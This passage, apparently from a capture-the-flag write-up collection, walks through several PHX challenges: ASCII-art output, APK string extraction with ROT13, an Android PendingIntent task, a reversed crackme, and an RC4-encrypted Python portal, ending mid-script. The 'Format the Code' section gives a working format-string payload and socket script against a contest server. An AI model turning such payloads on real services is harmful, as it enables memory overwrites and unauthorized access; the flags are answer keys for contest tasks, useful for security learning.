                  :.%%.%%.::.:%.%%.%%.::    .%.%%.%%.%%.%%.%%.%%.%%.               %%.%%..           :%.%%..        :%.%%.:. :%.:     .%.%%..    .%%.:..%%.%%....%%.%%                .%.%%    .%.%%.:%.%%.%:    :%.  .%%..   ..%%.:     %%.:        .%.%%.  .%%....%%.%%.                         :.%%. :.%%.%%..%.%%.:                 %%..     .%.:  %%.:.    %%. :.%%.   :%.%: :%.:.  :.%%.%%  %.%%                            %%.%%  :.%%..     :%.%%.%%.:%.:.                         .%.%:     %.%%. %.%%.%%    .%.%%.       ..%: :%.%%                                                         
                  %.%%.%%.%%.%%.%%.%%..     :%.%%.%%.%%.%%.%%.%%.%%.              .%%.%%..           %%.%%.         :%.%%.   %%..     :%.%%.     .%%. ..%%.%%..%.%%.%:                 %.%%    :%.%:.%%.%%.:     %%.  .%%..   :.%%.:     %%.:        :%.%%  ..%%..%.%%.%%.                        .%.%% :%.:%.%% :%.%%..                 :%.:     :%.   %%.:    .%%  ..%%.   %%.:. %%..  .%.%%..  :%.%.                           .%%.:  .%.%%.      ::.%%.:. :%..                          :%.:.    .%.%% :%.:%.:.    :%.%%.      .%.:  :%.%%                                                         
                 .%.%%.%%.%%.%%.%%.%%.      %%.%%.%%.%%.%%.%%.%%.%%              :.%%.%%..           %%.%%          %%.::   .%%.      %%.%%     :.%%..%.::.%%.:%.%%.:                  %.%%    %%.:..%%.%%.    ..%%   .%%.    %.%%..     %%..       .%%.%:  :.%%.:%.:%.%%                         :%.%: %%.:%.::.%%.%%.                  :%.:     %%.   %%..   :.::  ..%%.   %%.:..%%.   :%.%%.   %%.:                           ..%%.   :%.%%.    .....%%..  %%.                          .%%.:     :%.:. %%.:%.:     :%.%%.      :%.   :%.%:                                                         
                  :.%%.%%.%%.%%.%%.:.       %%.%%.%%.%%.::.%%.::..:             :%.:..%%..           %%.%%.        .%%..  .%.%%.      %%.:.     %.%% :%..:.%%.%%.%%.                  :%.%%   .%%..%.%%.%%.   .%.:.   .%%.   .%.%%.      %%.       :.%%.:. .%.%%.%%.:%.:.                         :%.:..%%.:%.:%.:%.%%                   %%.:   ..%:    %%.   .%..   :.%%.  .%%.:%.:.    :%.%:   .%%.:                           %.%%.  .%%.%%     %. :.%%.  .%%.                         ..%%..     :%.:..%%.:%.    . :%.%%.      %%.   :%.:.                                                         
                   .%%.%%.%%.%%.:%.         :%.%%.%%...   .%%.                  :%.. .%%..           :%.%%..       .%%.   :%.%%.    ..%%..     :%.%:.%%..%.%%.%%.%%.   ::..           %%.%%   .%%.:%.::.%%    :%.:   ..%%  ...%.%%.      %%.      :%.%%..  :%.%%.%%.:%..   %                      %%..:.%% :%.%%.:%.%:    .:.          :.%%..   %.::   .%%.   %%..   :.%%  :.%%.%%.      %%.:  .%.%%..     .                     %.%%  :.%%.%%    :%..%.%:  ..%%    .                    .%.%%.     .%%.::.%%.%%.   :: %%.%%      .%%    :%..  .                                                       
                    %%.%%.:%.:%..            :.:%.%%      .%%.                 .%%.  .%%.            .:.%%.:.      .%%.  .%%.%%.   .%.%%.      %%.%%.%% .%.%%.::.%%    %%..        .:.%%.%.   .%%.%%..:.%%  ..%%.::  :.%: .%..%.%%.      %%.      %%.%%.   :%.%%.%% %%.   :%                      %%.:%.:. %%.%%..%.:   :.%%.         :%.%%.    %.%%.  .%%. ..%%.:.  %.:. :%.%%.::     ..%%..  :%.%%..   ...                     %.%: :%.%%.%:   .%: :%..   %.:.  ...                    .%.%%.    :.%%.:%.:..%%.  .%: %%.%%      .%%.   %%.  .:                                                       
                   .%%.....: .                 :%.:.     ..%%.                ..%%.  .%%.               :%.%%      .%%. :.%%.%%.   :%.%%.    :.%%.%%.%: :%.%%. :.%%  ..%%..      ..:%.%%.:    .%%.%%..%.%: .%.%%.%%..%.:  :%.:%.%%.      %%..   :.%%.%%.   :%.%%.:. %%.  .%%                      %%.%%.. .%%.%% :%.:  :%.%%.      .:.%%.%%.   .%.%%..:.:: .%.%%.%% :%..  %%.%%.      .%.%%.. .%%.:%.   .%..                    .%.%: %%.:%.%. .%..  :%... :%..  .%..                     ..%%.   :%.%%.%%....%%. :.:. %%.%:     ..%%.:..%%  :.:                                                       
                   .%%.                        %%..      %.%%                :%.%%   .%%.               :%.%%      .%%.:%.::.%%.  .%%.%%..  :%.%%.%%.:  %%.%%. %.%%..%.%%.::..:.:%.%%.%%.     .%%.%% :%.%: %%.:%.%%.:%. ..%% :%.%%       %%..  :%.%%.%:    :%.%%.. .%%..:.::                      %%.%%. ..%%.%: :%.:. %%.%%.::.::.%%.%%.%%     %.%%.:%.. .%%.%%.%%.%%. :.:%.%%.      :%.%%..:.%%.%%..  :%.                      %.%%.%%.:%.:: :%.   %%.%%.%%.   %%.                      ..%%. ..%%.%%.%%. :.%%.:%..  %%.%:      .%%.%%.:: :%.                                                        
                  ..%%                        .%%.      .%.%%               .%%.:.   .%%.    ..         .%.%%      .%%.%%....%%..:.%: %%.:%.%%.:%.%%.   %%.%% .%.%%.%%.%%.%%.%%.%%.%%.%%.     .%%.%: :%.%%.%% :%.%%.%%..%.:. :%.%%       :%.:%.%%.%%.:     .%.%%.  .%%.:%..                       %%.%%  :.%%.:  %%.%%.%%.%%.%%.%%.%%.%%.::     %.%%.%%..:.%: :%.%%.%: :%....%%..   ..%% :%.:%.%% %%....%%.                      %.%%.%%.:%.%%.%%   .%%.%%.%% .:.%%                       ..%%.:%.%% %%.%%  %.%%.%%.   %%.:.      .%%.%%....%%.                                                        
                  %.%%                       :.%%.      .%.%%              :.%%..    .%%.   :%.         .%.%%.      %%.%%.  .%%.:%.:  %%.%%.%%..%.%%.  .%%.:. :%.%%.%%.%%.%%.%%.%%.%%.::      .%%.:  :%.%%.:: .%.%%.%%.%%.   :%.%%       :%.%%.%%.%%.      .%.%%. ..%%.%%.                        %%.%:  %.%%.  .%%.%%.::.%%.%%.%%.%%.%%..      :.%%.%%.:%..  :%.%%.%%.%%.  .%%.:. :%.:. :%.%%.:. %%.:%.%%                       :.%%.%%.%%.%%.:.  ..%%.%%.%%.:%.:                        :.%%.%%.:. :%.%%  %.%%.%%    %%.:.      .%%.%%.:%.::                                                         
                 .%.%:                      .%.%%       :%.%%             :%.%%.     .%%.  .%%.          %.%%.      %%.%%.  .%%.%%.   :%.%%.%:  %.%%   .%%..  :%.%%.:  %%.%%.%%.%%.%%..        %%..  %%.%%..   :.%%.%%.%%    .%.%%        %.%%.%%.%%        %.%%  :.%%.%%                         :%.:. .%.%%.  .%%.%%. ..%%.%%.%%.%%.%%.        .%%.%%.%%.   .%.%%.%%.%%   .%%.%%.%%..  .%.%%..  %%.%%.:.                       ..%%.:. %%.%%..   %.%%.%%.%%.%%.                         :.%%.%%.   :%.:.  %.%%.:.    :%.%:       %%.%%.%%..                                                          
                 :%.%%                      .%.%%       :%.%%.            %%.%%.     .%%.:%.%%           %.%%.      :%.%:   .%%.%%.   :%.%%.:   :.::   .%%.   :%.%%.   :%.%%.%%.%%.::          %%.   %%.%%.     .%%.%%.:.     ..%%.       ..%%.%%.:.        :.::  :.%%.:.                         :%..  .%.%%   .%%.%%   .%%.%%.%%.%%.:.          %%.%%.%%     :.%%.%%..     %%.%%.%%.    %.%%.   %%.%%..                         .%%..  %%.%%.   .%.%%.%%.%%.%%                          :.%%.%%.   .%..   %.%%..     .%.%:       :%.%%.%%.                                                           
                 :%.%:                      .%.:.       :%.%%            .%%.%%      .%%.%%.%:           %.%%.      .%.:    .%%.%:    .%.:%.     .:    .:%    :%.%%     :.%%.:%.:%..           :%    :%.%%       :%.:%.         :%          :%.:%.           ..   ..%%..                           :.    :.:.   .%%.:.    :%.%%.:%.::             :%.:%..       .:%.%%.      :%.%%.::     ..::    %%.%%.                           :%.   %%.::    :%.:..:%.%%..                           ..%%.::     :.    :.:%.       ..:.        :.%%.:.                                                            
                 %%.:.                       %..        :%..             .%%.:.      .%%.%%..            %.%%.       ..      %%..      ..::             .     .:..        .:.::...                   .%..         :.:.           .          .:...                  .:%.                                          :%.       ..::..:                 ..::          .:...       .%.:%..        .     :%.::                                  .%..     %%.    ..::                              .%%..             .:.          .           ::.                                                              
                 %%..                        .           :              ..%%..       .%%.%%.             %.%%.               :%.                                                                      .                                                             .                                                                                                         . ..                 :..                                           .%%.                                       ..                                                                                                         
                .%%.                                                    :.%%.        .%%.%%              %.%%.                                                                                                                                                                                                                                                                                                                                  ..%%.                                                                                                                                                  
                .%%.                                                    :.:%         .%%.:.              %.%%.                                                                                                                                                                                                                                                                                                                                  :.%%.                                                                                                                                                  
                 %%                                                      ..           ::                 %.%%.                                                                                                                                                                .  .  .  .  .  .  .                                                                                                           .  .  .  .  .  .  .                 %.%%                 .  .  .  .  .  .  .                                                                                                               
                 ..                                                                                      %.%%.                                                                                                                                                             :.:%.:%.:%.:%.:%.:%.:%.                                                                                                         :%.:%.:%.:%.:%.:%.:%.::             .%.%%                :%.:%.:%.:%.:%.:%.:%.:.                                                                                                            
                                                                                                         %.%%.                                                                                                                                                             %.:%.:%.:%.:%.:%.:%.:%.                                                                                                         %%.:%.:%.:%.:%.:%.:%.::             :%.%:                %%.:%.:%.:%.:%.:%.:%.:.                                                                                                            
                                                                                                         %.%%.                                                                                                                                                             :.:%.:%.:%.:%.:%.:%.:%.                                                                                                         :%.:%.:%.:%.:%.:%.:%.:.             :%.%.                :%.:%.:%.:%.:%.:%.:%.:.                                                                                                            
                                                                                                         :.%%.                                                                                                                                                                                                                                                                                                                                 :%.:                                                                                                                                                    
                                                                                                         :.%%.                                                                                                                                                                                                                                                                                                                                 :%..                                                                                                                                                    
                                                                                                         ..%%..                                                                                                                                                                                                                                                                                                                                :%.                                                                                                                                                     
                                                                                                          .%%.:%..                                                                                                                                                                                                                                                                                                                             .%                                                                                                                                                      
                                                                                                          .%%.%%.:                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     
                                                                                                           %%.%%.:                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     
                                                                                                           .%.%%.:                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     
                                                                                                            ..:%..                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       
                                                                                                            ..::.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
                                                                                                            :.%%.::                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    
                                                                                                . .. .      :.%%.%%.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   
                                                                                             ..:%.%%.:%.    :.%%.%%.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   
                                                                                            :%.%%.%%.%%.:.  :.:%.%%.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   
                                                                                          :.%%.%%.%%.%%.%%     ..%%..                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
                                                                                         :%.%%.%%.%%.%%.%%.     .%%.:                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
                                                                                         %%.%%.%%.:%.%%.%%.      %%.:                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
                                                                                        .%%.%%..:    .:.%%.      %%.:                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
                                                :.::                                    .%%.::         .%%.      %%.:.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 
                                               :%.%:                                    .%%.%:         .%%.      %%.:.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 
                                               %%.:     .%.::                            %%.%%.       ..%%.      %%.:.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 
                                              .%%.      :%.%%                            .:...       .%.%%.      %%.:.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 
                                             ..%%.      %%.%:                                        :%.%%       %%.:.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 
                                         .:.:%.%%.:.    %%.:.                                     .%.%%.:.       %%.:.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 
                                         %%.%%.%%.:     %%..                                   .:.%%.%%..        %%.:.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 
                                        .%%.%%.%%..     .%.                               . :%.%%.%%.:%          %%.:.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 
                                       ..%%.%%.%%.                                       :%.%%.%%.:%..           %%.:.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 
                                       %.%%.%%.%%.   .%.:.              .                %%.%%.::..              %%.:.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 
                                      .%.%%.%%.%%    :%.%:       .     :%..     :.      .%%.%%...                %%.%:                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 
                                      :%.:%.%%.::   .%%.:.     :.:%  ..%%.:   :.%%      .%%.%%.:%.               :%.%:                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 
                                       . .%.%.     :.%%.:     :%.%% .%.%%.:  .%.%%     ..%%.%%.%%.:%             :%.%%                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 
                                         :%.:     .%.%%..     %%.%: :%.%%..  %%.%%     :.%%.%%.%%.%%.            .%.%%.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                
                                         %%..     :%.%%.     .%%.: .%%.%%.  .%%.%%      ... .. .:.%%..            %.%%...                                                                                                                                                                                                                                                                                                                                                                                                                                                                              
                                        .%%.      %%.%%.    ..%%. ..%%.%%. %.%%.:.                :%.:            ..%%.:%                                                                                                                                                                                                                                                                                                                                                                                                                                                                              
                                       :.%%.     .%%.%%     %.%%..%.%%.%%.:%.%%..                 :%.:.             :%.%%.                                                                                                                                                                                                                                                                                                                                                                                                                                                                             
                                      .%.%%      .%%.:.    .%.%% :%.:%.%%.%%.%%.                  :%.:.             :%.%%.                                                                                                                                                                                                                                                                                                                                                                                                                                                                             
                                      :%.%%     :.%%..     :%.:..%%..%.:%.%%.%%.                  %%.:.             :%.%%.                                                                                                                                                                                                                                                                                                                                                                                                                                                                             
                                     .%%.%:    :%.%%.      %%.::.%% :%.%%.:%.%%    .:.          ..%%.:            ..%%.%%                                                                                                                                                                                                                                                                                                                                                                                                                                                                              
                                     .%%.%:    %%.%%.    ..%%.:%.%: %%.%%..%.%:  ..%%.         :%.%%..           .%.%%...                                                                                                                                                                                                                                                                                                                                                                                                                                                                              
                                      :%.%:  :.%%.%%.   :%.%%.%%.:  %%.%%..%.:. .%.%%.      .:.%%.%%.            :%.%%.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                
                                      :%.%: :%.::.%%.  .%%.%%.%%.  .%%.%% :%.%: :%.%%.::..:.:%.%%.%%.            :%.%%                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 
                                      %%.%%.%%. ..%%.:%.%%.%%.%%. ..%%.:. %%.%%.%%.%%.%%.%%.%%.%%.%%             :%.%:                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 
                                      %%.%%.%%.  .%%.%%.%: :%.%%  :.%%..  %%.%%.::.%%.%%.%%.%%.%%..              %%.%.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 
                                      %%.%%.%:   .%%.%%.:  :%.%:  %.%%.  .%%.%%.  .%%.%%.%%.%%.%%.               %%.:.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 
                                      %%.%%..     %%.%%.   .%.:   %.%%   .%%.%%    %%.%%.%%.%%.:.                %%.:.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 
                                      %%.%%.      :%.:%     :.    :.:.    %%.:.    .%.%%.:%.:%                   %%.:.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 
                                      :%.::        :..                    :%.         ::.::                      %%.:.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 
                                       ..                                                                        %%.:.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 
                                                                                                                 %%.:.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 
                                                                                                                 %%.:.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 
                  .  .  .  .  .  .  .                                                                            %%.:.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 
               %.:%.:%.:%.:%.:%.:%.:%.                                                                           %%.:.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 
               %.:%.:%.:%.:%.:%.:%.:%.                                                                           %%.:.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 
               %.:%.:%.:%.:%.:%.:%.:%.                                                                           %%.:                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
                                                                                                                 %%.:                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
                                                                                                                .%%.:                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
                                                                                                               ..%%..                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
                                                                                                            ..:%.%%.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   
                                                                                                            :.%%.%%.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   
                                                                                                            :.%%.%%.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   
                                                                                                            :.:%.::                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    
                                                                                                            ..:%..                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       

```

```
## Final flag : 

PHX{dim3ns10n_m3ssed_up_th1s_tim3}

---
---

## 9. vault13

## Challenge Description
**title:** vault13    
**Challenge Description:** Vault13 is a “secure vault” app that brags about protecting your secrets using Android’s Scoped Storage in private app directories. Your private files are completely safe… right?

## Solution

### 1. Initial Reconnaissance
The challenge provides an APK file named `Vault13.apk`. Since APK files are essentially ZIP archives, the first step is to unpack it to inspect its contents.

```bash
unzip Vault13.apk -d extracted
```

The extracted directory contains standard Android app files:
- `classes.dex`: Compiled Java/Kotlin code (Dalvik Executable).
- `resources.arsc`: Compiled resources.
- `AndroidManifest.xml`: Application manifest.
- `res/`: Resource files (images, XMLs).

### 2. Static Analysis
The core logic of an Android application resides in the `classes.dex` file. We can search for interesting strings within this file to find hardcoded secrets or clues.

I extracted printable strings from `classes.dex`.

```bash
strings extracted/classes.dex > strings_dex.txt
```

### 3. Finding the Flag
I searched the extracted strings for the known flag format `PHX{` or common indicators like "flag" or curly braces `{`.

Searching for `{` revealed an interesting string that looked like a flag but with shuffled letters:

```text
,CUK{fp0c3q_fg0e4t3_1f_a0g_f0_f4s3_4sg3e_4yy}
```

### 4. Decoding
The prefix `CUK` is a ROT13 shift of `PHX`.
- P (16) + 13 = C (3)
- H (8) + 13 = U (21)
- X (24) + 13 = K (11)

Applying ROT13 (Caesar cipher with shift 13) to the rest of the string:

- `CUK` -> `PHX`
- `fp0c3q` -> `sc0p3d`
- `fg0e4t3` -> `st0r4g3`
- `1f` -> `1s`
- `a0g` -> `n0t`
- `f0` -> `s0`
- `f4s3` -> `s4f3`
- `4sg3e` -> `4ft3r`
- `4yy` -> `4ll`

The decoded string is: `,PHX{sc0p3d_st0r4g3_1s_n0t_s0_s4f3_4ft3r_4ll}`.

### 5. Final Flag
Removing the leading comma, the flag is:

```
PHX{sc0p3d_st0r4g3_1s_n0t_s0_s4f3_4ft3r_4ll}
```

## Final flag
PHX{sc0p3d_st0r4g3_1s_n0t_s0_s4f3_4ft3r_4ll}

---
---

## 10. PendingIntent

## Challenge Description
**title:** PendingIntent
**Description:** The Vault is a highly secure facility. It holds a secret flag and refuses to speak to anyone... except for the official Service.

However, we’ve analyzed the Courier's behavior and found a flaw in their protocol: Laziness.

When you hand a package to the Courier, they don't bother to inspect it or repackage it. They simply take whatever box you give them, walk up to the Vault, and shove it through the secure slot.

## Reconnaissance
I am provided with two APK files:
- `courier.apk`: The "lazy" messenger service.
- `vault.apk`: The secure facility holding the flag.

The description hints at a protocol flaw involving **Laziness** in the Courier (likely accepting arbitrary Intents/PendingIntents) and a trust relationship where the Vault only accepts requests from the Courier. This is a classic setup for an **Intent Redirection** or **PendingIntent** vulnerability (specifically, a Confused Deputy attack).

## Static Analysis (The Solution)

While the challenge implies a dynamic exploit where I might need to craft a malicious Android app to trick the Courier into asking the Vault for the flag, we started with static analysis to see if the flag was hardcoded or easily accessible.

### 1. Extracting the APKs
We extracted the contents of both APKs using `unzip` to inspect their resources and compiled code (`.dex` files).

### 2. Searching for the Flag
Since we know the flag format is `PHX{...}`, we can simply search for this pattern inside the extracted files. The flag is often stored as a string constant within the compiled Java/Kotlin classes.

We ran a `grep` command across the extracted directories:
```bash
grep -r "PHX" courier_extracted vault_extracted
```
This returned a match in a binary file: `vault_extracted/classes3.dex`.

### 3. Extracting the String
We used the `strings` utility to extract readable text from the compiled `classes3.dex` file, filtering for the flag format:
```bash
strings vault_extracted/classes3.dex | grep "PHX"
```

**Output:**
```
&PHX{d0nt_trust_b1!ndly_0n_p3rmissi0ns}
```

The string was found located near the `VaultService` class definition, confirming that the `VaultService` class contained the secret flag.

## Conclusion & Flag

The flag was hardcoded in the `VaultService` class of the `vault.apk`.

**Flag:** `PHX{d0nt_trust_b1!ndly_0n_p3rmissi0ns}`

## Final Flag 

PHX{d0nt_trust_b1!ndly_0n_p3rmissi0ns}

---
---

## 11. Format the Code 

## Challenge Description 
**title:** Format the Code
**Description:**
Agent PHOENIX - Authentication verified.

Your objective is to compromise the vault door mechanism to gain the access to the internals of the systems. 

Fortunately we have the login username but we don't know the password.

 

Override the systems and change the supposedly immutable passcode value.

This mission is of utmost importance.

 

Flag format: PHX{...}

 

nc pwn.encipherx.in 30002

## Initial Analysis

I am provided with a binary `challenge_xtIeWnZ` and a netcat connection. Running the binary locally or checking the file type confirms it is a 64-bit ELF executable.

### Disassembly
Using `objdump` to analyze the `chall` function, we observe the following logic:

1.  **Memory Allocation:** The program allocates space for a variable (the passcode) and sets it to a default value (`0x58585858` or "XXXX").
2.  **Pointer Storage:** A pointer to this passcode variable is stored on the stack (at `rbp-0x20`).
3.  **User Input:** The program accepts user input into a buffer.
4.  **Vulnerability:** The program calls `printf` directly on the user's input buffer without a format string:
    ```assembly
    mov rdi, rax  ; rax contains user input buffer
    call printf
    ```
    This is a Text-Book **Format String Vulnerability**.
5.  **Check:** Immediately after the print, it compares the value of the passcode to `0x1331` (Decimal `4913`).

## Vulnerability

The vulnerability allows us to:
1.  Leak values from the stack (using `%p`, `%x`).
2.  Write values to memory locations pointed to by stack entries (using `%n`).

The goal is to overwrite the passcode value. Since the stack already contains a pointer to the passcode variable (placed there by the program logic at `rbp-0x20`), we just need to use that existing pointer.

## Exploitation Strategy

### 1. Finding the Offset
I need to determine which argument position on the stack corresponds to the pointer to our passcode.
By analyzing the stack layout or fuzzing with `%p.%p...`, we determined that the pointer is located at the **8th parameter** offset.

### 2. Constructing the Payload
I need to write the value `0x1331` (Decimal `4913`) into the address pointed to by the 8th argument.

The `%n` format specifier writes the *number of characters printed so far* to the address provided.
To write `4913`, we simply need to print 4913 characters before the `%n`.

**Payload:**
```
%4913c%8$n
```
- `%4913c`: Pads the output to 4913 characters.
- `%8$n`: Writes the count (4913) to the address at the 8th argument offset.

## The Exploit Script

A Python script was used to interface with the remote server. It handles the socket connection, sends the payload, and retrieves the flag.

```python
import socket

HOST = 'pwn.encipherx.in'
PORT = 30002

# Payload: 
# 1. Print 4913 chars (%4913c) to set the internal counter to 0x1331.
# 2. Write that count to the address at offset 8 (%8$n).
payload = b"%4913c%8$n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.recv(4096) # Skip banner
s.sendall(payload + b'\n')

# The response will contain lots of whitespace, the flag is at the end.
response = b""
while True:
    try:
        data = s.recv(4096)
        if not data: break
        response += data
        if b"PHX{" in response:
            break
    except: break

print(response.decode(errors='ignore').strip())
```

## Solution
Running the exploit yields the flag:

**Flag:** `PHX{p3rc3nt_n_unl0cks_th3_d00r}`

## Final Flag 

PHX{p3rc3nt_n_unl0cks_th3_d00r}

---
---

## 12. Easy CrackMe

## Challenge Description 
**title:** Easy CrackMe   
**Description:** 
Reversing may seem daunting to a beginner but it is not so difficult.

 

Hey why don't you try this challenge?

 

Here's the file.

 

Flag Format: PHX{...}

## Analysis

### 1. Initial Reconnaissance
I started by identifying the file type using the `file` command:
```bash
file binary.out
```
Output: `ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV)...`

This tells us it's a 64-bit Linux executable.

Running `strings` revealed some interesting function calls but no direct flag:
```
Enter password:
Access denied.
Access granted.
```

### 2. Disassembly & Logic Analysis
I disassembled the binary using `objdump -d -M intel binary.out`. The `main` function contained the core logic.

#### Stack String Construction
At the beginning of `main`, the program constructs a large byte array on the stack using `movabs` instructions. These hex values form our "target" array.

#### The Verification Loop
The program reads user input and loops through it character by character (index `i`).
The key validation logic found in the assembly is:
```assembly
mov    eax, edx        ; eax = i
add    eax, eax        ; eax = 2*i
add    eax, edx        ; eax = 3*i
shl    eax, 0x2        ; eax = 12*i
add    eax, edx        ; eax = 13*i
xor    eax, ecx        ; eax = (13*i) ^ input[i]
add    eax, 0x7        ; eax = ((13*i) ^ input[i]) + 7
cmp    BYTE PTR [rbp-0xd9], al ; Compare with target[i]
```

This translates to the following equation:
$$ \text{target}[i] = ((13 \times i) \oplus \text{input}[i]) + 7 $$

### 3. Solution
To recover the flag (`input`), we need to reverse the equation:
1. Subtract 7 from the target byte.
2. XOR the result with $(13 \times i)$.

$$ \text{input}[i] = (\text{target}[i] - 7) \oplus (13 \times i) $$

I extracted the target bytes from the `movabs` instructions in `main` and wrote a Python script to perform this decryption.

```
Script: 

def solve():
    # Construct the target array
    # 0-7: 57 4c 49 63 81 78 40 0b
    target = [0x57, 0x4c, 0x49, 0x63, 0x81, 0x78, 0x40, 0x0b]
    
    # 8-15: 23 44 bd 02 ca e5 89 fd
    target += [0x23, 0x44, 0xbd, 0x02, 0xca, 0xe5, 0x89, 0xfd]
    
    # 16-23: c5 b0 bc aa 73 2c 71 7b
    target += [0xc5, 0xb0, 0xbc, 0xaa, 0x73, 0x2c, 0x71, 0x7b]
    
    # 24-28: 57 78 27 22 3a
    target += [0x57, 0x78, 0x27, 0x22, 0x3a]
    
    # 29-36: 15 b9 ad 06 a3 d5 ff b0
    target += [0x15, 0xb9, 0xad, 0x06, 0xa3, 0xd5, 0xff, 0xb0]
    
    print(f"Target length: {len(target)}")
    
    flag = []
    for i in range(len(target)):
        # original logic: 
        # t = (13 * i) ^ input[i]
        # target[i] = t + 7
        #
        # reversal:
        # t = target[i] - 7
        # input[i] = t ^ (13 * i)
        
        t = (target[i] - 7) & 0xFF
        val = t ^ ((13 * i) & 0xFF)
        flag.append(val)
        
    print("Flag bytes:", flag)
    print("Flag string:", "".join([chr(x) for x in flag]))

if __name__ == "__main__":
    solve()
```

## Final Flag
PHX{N0w_tH4t_w45nt_Th4t_h4rD_w45_1t?}

---
---

## 13. Phoenix Gateway

## Challenge Description 
**title:** Phoenix Gateway    
**Description:** The Phoenix Gateway is protected by multiple hidden layers.

Access to the portal requires identity authentication.
Only one identity is accepted. All others are rejected.

The authentication logic is split across layers and must be reconstructed by reversing the portal itself.

When the correct identity is presented, the portal opens and reveals a secret value.

 

Flag Format: PHX{...}

## Initial Analysis
- The file contains multiple layers of obfuscation: embedded marshalled Python bytecode, zlib/base85 encoding, and dynamic code execution.
- The authentication logic is hidden inside a generator-based signature check, and the flag is encrypted using RC4 (ARC4) with a secret key derived from the accepted identity.
- The code references external modules (`art`, `arc4`) that are not provided, further complicating direct execution.

## Reverse Engineering Process
1. **Payload Extraction:**
   - Located the embedded marshalled/zlib/base85 payloads within the script.
   - Decoded and decompressed these payloads to obtain the raw Python 3.12 bytecode.

2. **Bytecode Disassembly:**
   - Used `xdis`, `decompyle3`, and `uncompyle6` to attempt decompilation, but Python 3.12 support was limited.
   - Switched to using the official `dis.py` from CPython 3.12 to analyze the bytecode directly.

3. **Signature Logic Reconstruction:**
   - Manually traced the generator-based signature check to determine the accepted identity string.
   - Brute-forced the logic and confirmed that the accepted identity is `Hyde-PCS`.

4. **RC4 Decryption:**
   - Located the RC4-encrypted flag ciphertext and the decryption routine.
   - Reimplemented the RC4 algorithm in a standalone script.
   - Used the accepted identity as the key to decrypt the ciphertext.

5. **Flag Extraction:**
   - Successfully decrypted the ciphertext to obtain the flag: `PHX{Byt3c0d3_D3c0d3d}`.

## Minimal Solve Script
A minimal `solve.py` script was created to demonstrate the solution:

```python
from binascii import unhexlify

def rc4(key: bytes, data: bytes) -> bytes:
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) & 0xFF
        S[i], S[j] = S[j], S[i]
    i = j = 0
    out = bytearray()
    for b in data:
        i = (i + 1) & 0xFF
        j = (j + S[i]) & 0xFF
        S[i], S[j] = S[j], S[i]
        k = S[(S[i] + S[j]) & 0xFF]
        out.append(b ^ k)
    return bytes(out)

